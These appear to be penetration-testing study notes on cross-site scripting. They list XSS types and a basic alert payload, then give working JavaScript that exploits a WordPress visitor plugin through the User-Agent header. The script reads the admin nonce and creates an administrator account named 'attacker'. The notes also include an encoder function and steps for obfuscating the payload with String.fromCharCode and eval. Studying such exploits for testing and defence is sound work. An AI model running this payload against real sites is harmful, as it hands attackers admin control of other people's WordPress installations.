# Cross Side Scripting

## Vulnerabilities

* Stored XSS: stored in DB; attack all users
* Reflected XSS: put script in crafted requests or links, attack a sinlge user
* DOM-based XSS: inject script into DOM and execute the exploit; Either stored or reflected

 With access to the DOM, you can redirect login forms, extract passwords, and steal session cookies.

 Look for input fields and try common characters `< > ' " { } ;`.

 URL encoding = % encoding or ascii e.g. %20, %21
 HTML encoding = special `<` or`>` char encoding e.g. `&lt;`,`&gt;`

## Basic Exploit

```html
User-Agent: <script>alert(42)</script>
```

## Privilege Escalation by XSS on WP Instance

Source: 

* Exploit `https://shift8web.ca/2018/01/craft-xss-payload-create-admin-user-in-wordpress-user/`
* JS Encoding `https://eve.gd/2007/05/23/string-fromcharcode-encoder/`
* URL Encoding `https://www.url-encode-decode.com/`

The script attacks the visitor plugin of WP. It exploit an XSS within the User-Agent header.The Code first requests a nonce using AJAX and then creates a new WP administrator "attacker" with "attackerpass". This payload has to be minified and encoded to be passed to the User-Agent header.

```js
// steal the nonce first
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
// then create a WP admin user
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

First, the JavaScript Payload has to be minified into a oneliner and encoded. We can use `https://jscompress.com` or `https://javascript-minifier.com`.

Next, the JS Encoding function converts every char into UTF-16 integer using `charCodeAt` and concate it with a comma. e.g. 118,97,... 

Alternatively we can use a handy online JS Encoding service `https://eve.gd/2007/05/23/string-fromcharcode-encoder/` that does the job. Or we can use an online URL encoding service `https://www.url-encode-decode.com/`.

```js
function encode_to_javascript(string) {
    var input = string
    var output = '';
    for(pos = 0; pos < input.length; pos++) {
        output += input.charCodeAt(pos);
        if(pos != (input.length - 1)) {
            output += ",";
        }
    }
    return output;
}
        
let encoded = encode_to_javascript('insert_minified_javascript_here')
console.log(encoded)
```


Finally, we can decode the integers on-demand in the script tag using `String.fromCharCode` and execute the script with `eval`.
